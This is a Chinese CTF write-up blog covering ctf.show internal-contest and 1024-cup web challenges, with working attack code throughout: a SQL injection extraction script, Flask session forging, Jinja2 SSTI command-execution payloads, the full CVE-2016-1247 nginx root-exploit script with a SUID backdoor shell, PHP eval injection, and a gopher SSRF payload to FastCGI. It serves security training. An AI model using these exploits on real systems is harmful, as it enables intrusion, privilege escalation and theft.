之前做过一次，这次又忘了怎么写脚本，还是说一句羽师傅tql
```python
import requests
import re
url1 = "http://80aa5350-d5f9-478b-91e7-71cd1b0fec5b.chall.ctf.show/register.php"
url2 = "http://80aa5350-d5f9-478b-91e7-71cd1b0fec5b.chall.ctf.show/login.php"
flag=''
for i in range(1,50):
    payload="hex(hex(substr((select/**/flag/**/from/**/flag)from/**/"+str(i)+"/**/for/**/1))),/*"
    print(payload)
    s=requests.session()
    data1={
        'e':str(i+30)+"',username="+payload,
        'u':"*/#",
        'p':i+30
        }
    #print(data1['e'])
    r1 = s.post(url1,data=data1)  
    data2={
        'e':i+30,
        'p':i+30
        }
    r2=s.post(url2,data=data2)
    t =r2.text
    real = re.findall("Hello (.*?),",t)[0]
    flag+=real
    print(flag)
```
最后两次hex解码即可得到flag
![](https://img-blog.csdnimg.cn/20201006163400759.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70#pic_center)
参考：[web1_签到](https://wp.ctf.show/d/94-web1/4)

### web2_蓝瘦_内部赛
提示：内存FLAG

这题是HCTF2018-admin的题目改的，当时只是学了一个Unicode欺骗，现在来学学flask session 伪造
>flask的session是存储在客户端cookie中的，而且flask仅仅对数据进行了签名。众所周知的是，签名的作用是防篡改，而无法防止被读取。而flask并没有提供加密操作，所以其session的全部内容都是可以在客户端读取的，这就可能造成一些安全问题。

python脚本如下：
```python
""" Flask Session Cookie Decoder/Encoder """
__author__ = 'Wilson Sumanang, Alexandre ZANNI'

# standard imports
import sys
import zlib
from itsdangerous import base64_decode
import ast

# Abstract Base Classes (PEP 3119)
if sys.version_info[0] < 3: # < 3.0
    raise Exception('Must be using at least Python 3')
elif sys.version_info[0] == 3 and sys.version_info[1] < 4: # >= 3.0 && < 3.4
    from abc import ABCMeta, abstractmethod
else: # > 3.4
    from abc import ABC, abstractmethod

# Lib for argument parsing
import argparse

# external Imports
from flask.sessions import SecureCookieSessionInterface

class MockApp(object):

    def __init__(self, secret_key):
        self.secret_key = secret_key


if sys.version_info[0] == 3 and sys.version_info[1] < 4: # >= 3.0 && < 3.4
    class FSCM(metaclass=ABCMeta):
        def encode(secret_key, session_cookie_structure):
            """ Encode a Flask session cookie """
            try:
                app = MockApp(secret_key)

                session_cookie_structure = dict(ast.literal_eval(session_cookie_structure))
                si = SecureCookieSessionInterface()
                s = si.get_signing_serializer(app)

                return s.dumps(session_cookie_structure)
            except Exception as e:
                return "[Encoding error] {}".format(e)
                raise e


        def decode(session_cookie_value, secret_key=None):
            """ Decode a Flask cookie  """
            try:
                if(secret_key==None):
                    compressed = False
                    payload = session_cookie_value

                    if payload.startswith('.'):
                        compressed = True
                        payload = payload[1:]

                    data = payload.split(".")[0]

                    data = base64_decode(data)
                    if compressed:
                        data = zlib.decompress(data)

                    return data
                else:
                    app = MockApp(secret_key)

                    si = SecureCookieSessionInterface()
                    s = si.get_signing_serializer(app)

                    return s.loads(session_cookie_value)
            except Exception as e:
                return "[Decoding error] {}".format(e)
                raise e
else: # > 3.4
    class FSCM(ABC):
        def encode(secret_key, session_cookie_structure):
            """ Encode a Flask session cookie """
            try:
                app = MockApp(secret_key)

                session_cookie_structure = dict(ast.literal_eval(session_cookie_structure))
                si = SecureCookieSessionInterface()
                s = si.get_signing_serializer(app)

                return s.dumps(session_cookie_structure)
            except Exception as e:
                return "[Encoding error] {}".format(e)
                raise e


        def decode(session_cookie_value, secret_key=None):
            """ Decode a Flask cookie  """
            try:
                if(secret_key==None):
                    compressed = False
                    payload = session_cookie_value

                    if payload.startswith('.'):
                        compressed = True
                        payload = payload[1:]

                    data = payload.split(".")[0]

                    data = base64_decode(data)
                    if compressed:
                        data = zlib.decompress(data)

                    return data
                else:
                    app = MockApp(secret_key)

                    si = SecureCookieSessionInterface()
                    s = si.get_signing_serializer(app)

                    return s.loads(session_cookie_value)
            except Exception as e:
                return "[Decoding error] {}".format(e)
                raise e


if __name__ == "__main__":
    # Args are only relevant for __main__ usage
    
    ## Description for help
    parser = argparse.ArgumentParser(
                description='Flask Session Cookie Decoder/Encoder',
                epilog="Author : Wilson Sumanang, Alexandre ZANNI")

    ## prepare sub commands
    subparsers = parser.add_subparsers(help='sub-command help', dest='subcommand')

    ## create the parser for the encode command
    parser_encode = subparsers.add_parser('encode', help='encode')
    parser_encode.add_argument('-s', '--secret-key', metavar='<string>',
                                help='Secret key', required=True)
    parser_encode.add_argument('-t', '--cookie-structure', metavar='<string>',
                                help='Session cookie structure', required=True)

    ## create the parser for the decode command
    parser_decode = subparsers.add_parser('decode', help='decode')
    parser_decode.add_argument('-s', '--secret-key', metavar='<string>',
                                help='Secret key', required=False)
    parser_decode.add_argument('-c', '--cookie-value', metavar='<string>',
                                help='Session cookie value', required=True)

    ## get args
    args = parser.parse_args()

    ## find the option chosen
    if(args.subcommand == 'encode'):
        if(args.secret_key is not None and args.cookie_structure is not None):
            print(FSCM.encode(args.secret_key, args.cookie_structure))
    elif(args.subcommand == 'decode'):
        if(args.secret_key is not None and args.cookie_value is not None):
            print(FSCM.decode(args.cookie_value,args.secret_key))
        elif(args.cookie_value is not None):
            print(FSCM.decode(args.cookie_value))
```
查看源码有提示key的值
![](https://img-blog.csdnimg.cn/20201006191811618.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70#pic_center)
```bash
解密:python flask_session_manager.py decode -c -s # -c是flask cookie里的session值 -s参数是SECRET_KEY
加密:python flask_session_manager.py encode -s -t # -s参数是SECRET_KEY -t参数是session的参照格式，也就是session解密后的格式
```
首先进行解密，得到`{'username': '3213'}`

![](https://img-blog.csdnimg.cn/20201006193144693.png#pic_center)
再伪造admin进行加密得到cookie，替换即可为admin
![](https://img-blog.csdnimg.cn/2020100619325086.png#pic_center)
变为了缺少请求参数
![](https://img-blog.csdnimg.cn/2020100619344325.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70#pic_center)
之前源码有个提示`param：ctfshow`，那么尝试请求：
```python
?ctfshow={{2*2}}
``` 
发现为4，是ssti
![](https://img-blog.csdnimg.cn/20201006193640611.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70#pic_center)
直接上payload：
```python
{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].eval("__import__('os').popen('ls').read()") }}{% endif %}{% endfor %}
提示说flag在内存，那么查看环境变量：Linux查看环境变量使用env命令显示所有的环境变量
{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].eval("__import__('os').popen('env').read()") }}{% endif %}{% endfor %}
```
![](https://img-blog.csdnimg.cn/20201006194933502.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70#pic_center)


参考：
[CTFSHOW内部赛 Web2 -蓝瘦](https://wp.ctf.show/d/93-ctfshow-web2)


### web3_出题人不想跟你说话.jpg_内部赛
为了降低难度，漏洞大约每两分钟触发一次

hint1: whoami && ls -l /
hint2:如你们所说，提权，看看服务器有什么服务

![](https://img-blog.csdnimg.cn/2020100617061026.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70#pic_center)
只有两个信息，一个title一个图片，猜测存在webshell，密码为cai，连接成功

发现根目录存在flag，但并没有权限，需要提权！
![](https://img-blog.csdnimg.cn/20201006170944990.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70#pic_center)根据提示说漏洞每2分钟触发一次，猜测可能有定时任务，`cat /etc/crontab`

![](https://img-blog.csdnimg.cn/20201006171149249.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70#pic_center)最后一个任务一分钟执行一次，搜索到漏洞为：
[Nginx权限提升漏洞(CVE-2016-1247) 分析](https://blog.knownsec.com/2016/11/nginx-exploit-deb-root-privesc-cve-2016-1247/)
[Nginx 权限提升漏洞 (Debian、Ubuntu发行版) ](https://www.seebug.org/vuldb/ssvid-92538)

`nginx -v` 查看当前版本为1.4.6，存在漏洞，直接上poc
![](https://img-blog.csdnimg.cn/20201006171335917.png#pic_center)
上传文件.sh到目录下
```bash
#!/bin/bash
#
# Nginx (Debian-based distros) - Root Privilege Escalation PoC Exploit
# nginxed-root.sh (ver. 1.0)
#
# CVE-2016-1247
#
# Discovered and coded by:
#
# Dawid Golunski
# dawid[at]legalhackers.com
#
# https://legalhackers.com
#
# Follow https://twitter.com/dawid_golunski for updates on this advisory.
#
# ---
# This PoC exploit allows local attackers on Debian-based systems (Debian, Ubuntu
# etc.) to escalate their privileges from nginx web server user (www-data) to root 
# through unsafe error log handling.
#
# The exploit waits for Nginx server to be restarted or receive a USR1 signal.
# On Debian-based systems the USR1 signal is sent by logrotate (/etc/logrotate.d/nginx)
# script which is called daily by the cron.daily on default installations.
# The restart should take place at 6:25am which is when cron.daily executes.
# Attackers can therefore get a root shell automatically in 24h at most without any admin
# interaction just by letting the exploit run till 6:25am assuming that daily logrotation 
# has been configured. 
#
#
# Exploit usage:
# ./nginxed-root.sh path_to_nginx_error.log 
#
# To trigger logrotation for testing the exploit, you can run the following command:
#
# /usr/sbin/logrotate -vf /etc/logrotate.d/nginx
#
# See the full advisory for details at:
# https://legalhackers.com/advisories/Nginx-Exploit-Deb-Root-PrivEsc-CVE-2016-1247.html
#
# Video PoC:
# https://legalhackers.com/videos/Nginx-Exploit-Deb-Root-PrivEsc-CVE-2016-1247.html
#
#
# Disclaimer:
# For testing purposes only. Do no harm.
#

BACKDOORSH="/bin/bash"
BACKDOORPATH="/tmp/nginxrootsh"
PRIVESCLIB="/tmp/privesclib.so"
PRIVESCSRC="/tmp/privesclib.c"
SUIDBIN="/usr/bin/sudo"

function cleanexit {
    # Cleanup 
    echo -e "\n[+] Cleaning up..."
    rm -f $PRIVESCSRC
    rm -f $PRIVESCLIB
    rm -f $ERRORLOG
    touch $ERRORLOG
    if [ -f /etc/ld.so.preload ]; then
        echo -n > /etc/ld.so.preload
    fi
    echo -e "\n[+] Job done. Exiting with code $1 \n"
    exit $1
}

function ctrl_c() {
        echo -e "\n[+] Ctrl+C pressed"
    cleanexit 0
}

#intro 

cat <<_eascii_
 _______________________________
< Is your server (N)jinxed ? ;o >
 -------------------------------
           \ 
            \          __---__
                    _-       /--______
               __--( /     \ )XXXXXXXXXXX\v.  
             .-XXX(   O   O  )XXXXXXXXXXXXXXX- 
            /XXX(       U     )        XXXXXXX\ 
          /XXXXX(              )--_  XXXXXXXXXXX\ 
         /XXXXX/ (      O     )   XXXXXX   \XXXXX\ 
         XXXXX/   /            XXXXXX   \__ \XXXXX
         XXXXXX__/          XXXXXX         \__---->
 ---___  XXX__/          XXXXXX      \__         /
   \-  --__/   ___/\  XXXXXX            /  ___--/=
    \-\    ___/    XXXXXX              '--- XXXXXX
       \-\/XXX\ XXXXXX                      /XXXXX
         \XXXXXXXXX   \                    /XXXXX/
          \XXXXXX      >                 _/XXXXX/
            \XXXXX--__/              __-- XXXX/
             -XXXXXXXX---------------  XXXXXX-
                \XXXXXXXXXXXXXXXXXXXXXXXXXX/
                  ""VXXXXXXXXXXXXXXXXXXV""
_eascii_

echo -e "\033[94m \nNginx (Debian-based distros) - Root Privilege Escalation PoC Exploit (CVE-2016-1247) \nnginxed-root.sh (ver. 1.0)\n"
echo -e "Discovered and coded by: \n\nDawid Golunski \nhttps://legalhackers.com \033[0m"

# Args
if [ $# -lt 1 ]; then
    echo -e "\n[!] Exploit usage: \n\n$0 path_to_error.log \n"
    echo -e "It seems that this server uses: `ps aux | grep nginx | awk -F'log-error=' '{ print $2 }' | cut -d' ' -f1 | grep '/'`\n"
    exit 3
fi

# Priv check

echo -e "\n[+] Starting the exploit as: \n\033[94m`id`\033[0m"
id | grep -q www-data
if [ $? -ne 0 ]; then
    echo -e "\n[!] You need to execute the exploit as www-data user! Exiting.\n"
    exit 3
fi

# Set target paths
ERRORLOG="$1"
if [ ! -f $ERRORLOG ]; then
    echo -e "\n[!] The specified Nginx error log ($ERRORLOG) doesn't exist. Try again.\n"
    exit 3
fi

# [ Exploitation ]

trap ctrl_c INT
# Compile privesc preload library
echo -e "\n[+] Compiling the privesc shared library ($PRIVESCSRC)"
cat <<_solibeof_>$PRIVESCSRC
#define _GNU_SOURCE
#include <stdio.h>
#include <sys/stat.h>
#include <unistd.h>
#include <dlfcn.h>
       #include <sys/types.h>
       #include <sys/stat.h>
       #include <fcntl.h>

uid_t geteuid(void) {
    static uid_t  (*old_geteuid)();
    old_geteuid = dlsym(RTLD_NEXT, "geteuid");
    if ( old_geteuid() == 0 ) {
        chown("$BACKDOORPATH", 0, 0);
        chmod("$BACKDOORPATH", 04777);
        unlink("/etc/ld.so.preload");
    }
    return old_geteuid();
}
_solibeof_
/bin/bash -c "gcc -Wall -fPIC -shared -o $PRIVESCLIB $PRIVESCSRC -ldl"
if [ $? -ne 0 ]; then
    echo -e "\n[!] Failed to compile the privesc lib $PRIVESCSRC."
    cleanexit 2;
fi


# Prepare backdoor shell
cp $BACKDOORSH $BACKDOORPATH
echo -e "\n[+] Backdoor/low-priv shell installed at: \n`ls -l $BACKDOORPATH`"

# Safety check
if [ -f /etc/ld.so.preload ]; then
    echo -e "\n[!] /etc/ld.so.preload already exists. Exiting for safety."
    exit 2
fi

# Symlink the log file
rm -f $ERRORLOG && ln -s /etc/ld.so.preload $ERRORLOG
if [ $? -ne 0 ]; then
    echo -e "\n[!] Couldn't remove the $ERRORLOG file or create a symlink."
    cleanexit 3
fi
echo -e "\n[+] The server appears to be \033[94m(N)jinxed\033[0m (writable logdir) ! :) Symlink created at: \n`ls -l $ERRORLOG`"

# Make sure the nginx access.log contains at least 1 line for the logrotation to get triggered
curl http://localhost/ >/dev/null 2>/dev/null
# Wait for Nginx to re-open the logs/USR1 signal after the logrotation (if daily 
# rotation is enable in logrotate config for nginx, this should happen within 24h at 6:25am)
echo -ne "\n[+] Waiting for Nginx service to be restarted (-USR1) by logrotate called from cron.daily at 6:25am..."
while :; do 
    sleep 1
    if [ -f /etc/ld.so.preload ]; then
        echo $PRIVESCLIB > /etc/ld.so.preload
        rm -f $ERRORLOG
        break;
    fi
done

# /etc/ld.so.preload should be owned by www-data user at this point
# Inject the privesc.so shared library to escalate privileges
echo $PRIVESCLIB > /etc/ld.so.preload
echo -e "\n[+] Nginx restarted. The /etc/ld.so.preload file got created with web server privileges: \n`ls -l /etc/ld.so.preload`"
echo -e "\n[+] Adding $PRIVESCLIB shared lib to /etc/ld.so.preload"
echo -e "\n[+] The /etc/ld.so.preload file now contains: \n`cat /etc/ld.so.preload`"
chmod 755 /etc/ld.so.preload

# Escalating privileges via the SUID binary (e.g. /usr/bin/sudo)
echo -e "\n[+] Escalating privileges via the $SUIDBIN SUID binary to get root!"
sudo 2>/dev/null >/dev/null

# Check for the rootshell
ls -l $BACKDOORPATH
ls -l $BACKDOORPATH | grep rws | grep -q root
if [ $? -eq 0 ]; then 
    echo -e "\n[+] Rootshell got assigned root SUID perms at: \n`ls -l $BACKDOORPATH`"
    echo -e "\n\033[94mThe server is (N)jinxed ! ;) Got root via Nginx!\033[0m"
else
    echo -e "\n[!] Failed to get root"
    cleanexit 2
fi

rm -f $ERRORLOG
echo > $ERRORLOG

# Use the rootshell to perform cleanup that requires root privilges
$BACKDOORPATH -p -c "rm -f /etc/ld.so.preload; rm -f $PRIVESCLIB"
# Reset the logging to error.log
$BACKDOORPATH -p -c "kill -USR1 `pidof -s nginx`"

# Execute the rootshell
echo -e "\n[+] Spawning the rootshell $BACKDOORPATH now! \n"
$BACKDOORPATH -p -i

# Job done.
cleanexit 0
```

参考：[CTFSHOW内部赛 web03_出题人不想跟你说话.jpg](https://wp.ctf.show/d/87-ctfshow-web03-jpg)

### web4_一览无余_内部赛 
啥都没有，直接看wp发现为**CVE-2019-11043**
利用工具：[PHuiP-FPizdaM](https://github.com/neex/phuip-fpizdam)
![](https://img-blog.csdnimg.cn/20201006204201294.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70#pic_center)执行成功，那么即可得到flag
p神友情提示：您应该注意，只有部分PHP-FPM子进程受到了污染，因此请尝试几次以执行该命令。

![](https://img-blog.csdnimg.cn/20201006204338710.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70#pic_center)

参考：
[PHP-FPM 远程代码执行漏洞（CVE-2019-11043）](https://github.com/vulhub/vulhub/blob/master/php/CVE-2019-11043/README.zh-cn.md)
[PHP 远程代码执行漏洞复现（CVE-2019-11043）【反弹shell成功】 ](http://blog.leanote.com/post/snowming/9da184ef24bd)

### web5_登陆就有flag_内部赛 
1：长度限制为5
2：存在过滤且过滤的字符会有回显

**空异或0会查到所有非数字开头的记录**

payload:
```
'^0#   '^''#   '<>1#   '<1#   '&0#   '<<0#   '>>0#   '&''#   '/9#
```
![](https://img-blog.csdnimg.cn/20201009150804135.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70#pic_center)
参考：[CTFSHOW内部赛web5_登陆就有flag](https://wp.ctf.show/d/86-ctfshow-web5-flag)
### web6_签退_内部赛
给出了源码：
```php
<?php 
($S = $_GET['S'])?eval("$$S"):highlight_file(__FILE__);
```

直接上payload：
`?S=a;system('cat ../../flag.txt');`
或者变量覆盖：
`?S=a=system('cat ../../flag.txt');`
![](https://img-blog.csdnimg.cn/20201009154901604.png#pic_center)

## 1024杯
### 1024_WEB签到
题目给了源码，可以调用phpinfo函数，我是笨比
```php
<?php
error_reporting(0);
highlight_file(__FILE__);
call_user_func($_GET['f']);
```
![](https://img-blog.csdnimg.cn/20201026120317559.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70#pic_center)
看到有个`function:ctfshow_1024 support`，那么调用ctfshow_1024就出来了
![](https://img-blog.csdnimg.cn/20201026120427224.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70#pic_center)
### 1024_fastapi
>FastAPI 是一个高性能 Web 框架，用于构建 API。
主要特性：
>- 快速：非常高的性能，与 NodeJS 和 Go 相当
>- 快速编码：将功能开发速度提高约 200％ 至 300％
>- 更少的错误：减少约 40％ 的人为错误
>- 直观：强大的编辑器支持，自动补全无处不在，调试时间更少
>- 简易：旨在易于使用和学习，减少阅读文档的时间。
>- 简短：减少代码重复。
>- 稳健：获取可用于生产环境的代码，具有自动交互式文档
>- 基于标准：基于并完全兼容 API 的开放标准 OpenAPI 和 JSON Schema

发现其自带交互式API文档，访问`/docs`页，有采用POST方式传参的`/cccalccc`页，参数q传入计算式得到结果
![](/bmth_blog/images/pasted-38.png)
发现结果为list或string类型的都Internal Server Error或结果为空，尝试str，发现成功：
`str([].__class__.__base__.__subclasses__()[25])`
![](/bmth_blog/images/pasted-39.png)
尝试查找`warnings.catch_warnings`所在下标，以进一步命令执行。爆破下标输出各元素：
```python
import requests

url='http://6604dfa1-6e9b-4921-81a7-03ac2f98eb35.chall.ctf.show/cccalccc'
for i in range(500):
	data={'q':'str([].__class__.__base__.__subclasses__()['+str(i)+'])'}
	r=requests.post(url,data)
	print('i = ',i, r.text)
```
发现下标189为`warnings.catch_warnings`
![](/bmth_blog/images/pasted-40.png)
```python
[].__class__.__base__.__subclasses__()[189].__init__.__globals__['__builtins__']['__import__']('os').system('ls')
```
发现过滤了import和system关键字，`'import'`用`'__imp'+'ort__'`代替，`system`用`popen`代替
payload:
```python
[].__class__.__base__.__subclasses__()[189].__init__.__globals__['__builtins__']['__imp'+'ort__']('os').__dict__['pop'+'en']('ls').read()
```
根目录无flag文件，单个目录查找flag关键字：
```python
[].__class__.__base__.__subclasses__()[189].__init__.__globals__['__builtins__']['__imp'+'ort__']('os').__dict__['pop'+'en']('find /app | xargs grep flag').read()
```
![](/bmth_blog/images/pasted-41.png)
最后读取即可得到flag

### 1024_hello_world
[SSTI模板注入及绕过姿势(基于Python-Jinja2)](https://blog.csdn.net/solitudi/article/details/107752717)
```
把{{和}}过滤了，尝试使用{%%}这种形式的，发现成功执行
```
过滤了的会报`500 Internal Server Error`
```python
key={%if ""!=1%}air{%endif%}	#正常
key={%if "".__class__!=1%}air{%endif%}	#error
key={%if ""["\x5f\x5fclass\x5f\x5f"]!=1%}air{%endif%}	#正常
key={%if ""["\x5f\x5fclass\x5f\x5f"]["\x5f\x5fbase\x5f\x5f"]["\x5f\x5fsubclasses\x5f\x5f"]()!=1%}air{%endif%}	#正常
```
其中`_是\x5f，.是\x2E`
在这里由于没有回显，不知道`"".__class__.__base__.__subclasses__()`下具体使用哪个下标，所以直接在bp里爆破
```python
"".__class__.__base__.__subclasses__()[?].__init__.__globals__["__builtins__"]["__import__"]("os")
```
回显状态码为200的都是可以选用的，得到：
![](/bmth_blog/images/pasted-42.png)
得到
```python
key={%if ""["\x5f\x5fclass\x5f\x5f"]["\x5f\x5fbase\x5f\x5f"]["\x5f\x5fsubclasses\x5f\x5f"]()[64]["\x5f\x5finit\x5f\x5f"]["\x5f\x5fglobals\x5f\x5f"]["\x5f\x5fbuiltins\x5f\x5f"]["\x5f\x5fimport\x5f\x5f"]("os")!=1%}air{%endif%}
进行盲注：
key={%if ""["\x5f\x5fclass\x5f\x5f"]["\x5f\x5fbase\x5f\x5f"]["\x5f\x5fsubclasses\x5f\x5f"]()[64]["\x5f\x5finit\x5f\x5f"]["\x5f\x5fglobals\x5f\x5f"]["\x5f\x5fbuiltins\x5f\x5f"]["\x5f\x5fimport\x5f\x5f"]("os")["\x5f\x5fdict\x5f\x5f"]["popen"]("ls /")["read"]()[0]=="a"%}air{%endif%}

```
最后进行盲注得flag
```python
import requests
import string
strs = string.digits+string.ascii_lowercase+'-_{}'

url = 'http://82f7f9c9-3c5c-4665-85a8-a99784ed750a.chall.ctf.show/'
#cmd = 'ls /'
cmd = 'cat /ctfshow*'

res = ''
for i in range(0,50):
	print('i =',i,end='\t')
	for ch in strs:
		payload = '{%if ""["\\x5f\\x5fclass\\x5f\\x5f"]["\\x5f\\x5fbase\\x5f\\x5f"]["\\x5f\\x5fsubclasses\\x5f\\x5f"]()[64]["\\x5f\\x5finit\\x5f\\x5f"]["\\x5f\\x5fglobals\\x5f\\x5f"]["\\x5f\\x5fbuiltins\\x5f\\x5f"]["\\x5f\\x5fimport\\x5f\\x5f"]("os")["\\x5f\\x5fdict\\x5f\\x5f"]["popen"]("'+cmd+'")["read"]()['+str(i)+']=="'+ch+'"%}air{%endif%}'
		#print(payload)
		data = {'key':payload}
		r = requests.post(url,data)
		#print(r.text)
		if 'air' in r.text:
			res += ch
			print('res = '+res)
			break
```
![](/bmth_blog/images/pasted-43.png)

### 1024_图片代理
发现是base64编码
![](/bmth_blog/images/pasted-44.png)
那么读取一下nginx的默认配置文件`file:///etc/nginx/conf.d/default.conf`
即`?picurl=ZmlsZTovLy9ldGMvbmdpbngvY29uZi5kL2RlZmF1bHQuY29uZg==`
有用信息：
```
root         /var/www/bushihtml;
index        index.php index.html;
fastcgi_pass   127.0.0.1:9000;
```
![](/bmth_blog/images/pasted-45.png)
这题是ssrf攻击fastcgi，直接使用Gopherus工具进行攻击
`python gopherus.py --exploit fastcgi`
![](/bmth_blog/images/pasted-46.png)
```
gopher://127.0.0.1:9000/_%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%01%09%01%00%0F%10SERVER_SOFTWAREgo%20/%20fcgiclient%20%0B%09REMOTE_ADDR127.0.0.1%0F%08SERVER_PROTOCOLHTTP/1.1%0E%02CONTENT_LENGTH56%0E%04REQUEST_METHODPOST%09KPHP_VALUEallow_url_include%20%3D%20On%0Adisable_functions%20%3D%20%0Aauto_prepend_file%20%3D%20php%3A//input%0F%1CSCRIPT_FILENAME/var/www/bushihtml/index.php%0D%01DOCUMENT_ROOT/%00%01%04%00%01%00%00%00%00%01%05%00%01%008%04%00%3C%3Fphp%20system%28%27ls%20/%27%29%3Bdie%28%27-----Made-by-SpyD3r-----%0A%27%29%3B%3F%3E%00%00%00%00
#base64编码后的值:
Z29waGVyOi8vMTI3LjAuMC4xOjkwMDAvXyUwMSUwMSUwMCUwMSUwMCUwOCUwMCUwMCUwMCUwMSUwMCUwMCUwMCUwMCUwMCUwMCUwMSUwNCUwMCUwMSUwMSUwOSUwMSUwMCUwRiUxMFNFUlZFUl9TT0ZUV0FSRWdvJTIwLyUyMGZjZ2ljbGllbnQlMjAlMEIlMDlSRU1PVEVfQUREUjEyNy4wLjAuMSUwRiUwOFNFUlZFUl9QUk9UT0NPTEhUVFAvMS4xJTBFJTAyQ09OVEVOVF9MRU5HVEg1NiUwRSUwNFJFUVVFU1RfTUVUSE9EUE9TVCUwOUtQSFBfVkFMVUVhbGxvd191cmxfaW5jbHVkZSUyMCUzRCUyME9uJTBBZGlzYWJsZV9mdW5jdGlvbnMlMjAlM0QlMjAlMEFhdXRvX3ByZXBlbmRfZmlsZSUyMCUzRCUyMHBocCUzQS8vaW5wdXQlMEYlMUNTQ1JJUFRfRklMRU5BTUUvdmFyL3d3dy9idXNoaWh0bWwvaW5kZXgucGhwJTBEJTAxRE9DVU1FTlRfUk9PVC8lMDAlMDElMDQlMDAlMDElMDAlMDAlMDAlMDAlMDElMDUlMDAlMDElMDA4JTA0JTAwJTNDJTNGcGhwJTIwc3lzdGVtJTI4JTI3bHMlMjAvJTI3JTI5JTNCZGllJTI4JTI3LS0tLS1NYWRlLWJ5LVNweUQzci0tLS0tJTBBJTI3JTI5JTNCJTNGJTNFJTAwJTAwJTAwJTAw
```
得到flag
![](/bmth_blog/images/pasted-47.png)


### 1024_柏拉图 
通过双写绕过读源代码 `filefile://:///var/www/html/index.php`
![](/bmth_blog/images/pasted-48.png)
index.php
```php
<?php
error_reporting(0);

function curl($url){  
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_HEADER, 0);
    echo curl_exec($ch);
    curl_close($ch);
}
if(isset($_GET['url'])){
    $url = $_GET['url'];
    $bad = 'file://';
    if(preg_match('/dict|127|localhost|sftp|Gopherus|http|\.\.\/|flag|[0-9]/is', $url,$match))
		{
			die('难道我不知道你在想什么？除非绕过我？！');
    }else{
      $url=str_replace($bad,"",$url);
      curl($url);
    }
}
?>
```
upload.php
```php
<?php
error_reporting(0);
if(isset($_FILES["file"])){
if (($_FILES["file"]["type"]=="image/gif")&&(substr($_FILES["file"]["name"], strrpos($_FILES["file"]["name"], '.')+1))== 'gif') {

    if (file_exists("upload/" . $_FILES["file"]["name"])){
      echo $_FILES["file"]["name"] . " 文件已经存在啦！";
    }else{
      move_uploaded_file($_FILES["file"]["tmp_name"],"upload/" .$_FILES["file"]["name"]);
      echo "文件存储在: " . "upload/" . $_FILES["file"]["name"];
    }
}else{
      echo "这个文件我不喜欢，我喜欢一个gif的文件";
    }
}
?>
```
readfile.php
```php
<?php
error_reporting(0);
include('class.php');
function check($filename){  
    if (preg_match("/^phar|^smtp|^dict|^zip|file|etc|root|filter|\.\.\//i",$filename)){
        die("姿势太简单啦，来一点骚的？！");
    }else{
        return 0;
    }
}
if(isset($_GET['filename'])){
    $file=$_GET['filename'];
        if(strstr($file, "flag") || check($file) || strstr($file, "php")) {
            die("这么简单的获得不可能吧？！");
        }
        echo readfile($file);
}
?>
```
unlink.php
```php
<?php
error_reporting(0);
$file=$_GET['filename'];
function check($file){  
  if (preg_match("/\.\.\//i",$file)){
      die("你想干什么？！");
  }else{
      return $file;
  }
}
if(file_exists("upload/".$file)){
      if(unlink("upload/".check($file))){
          echo "删除".$file."成功！";
      }else{
          echo "删除".$file."失败！";
      }
}else{
    echo '要删除的文件不存在！';
}
?>
```
class.php
```php
<?php
error_reporting(0);
class A {
    public $a;
    public function __construct($a)
    {
        $this->a = $a;
    }
    public function __destruct()
    {
        echo "THI IS CTFSHOW".$this->a;
    }
}
class B {
    public $b;
    public function __construct($b)
    {
        $this->b = $b;
    }
    public function __toString()
    {
        return ($this->b)();
    }
}
class C{
    public $c;
    public function __construct($c)
    {
        $this->c = $c;
    }
    public function __invoke()
    {
        return eval($this->c);
    }
}
?>
```
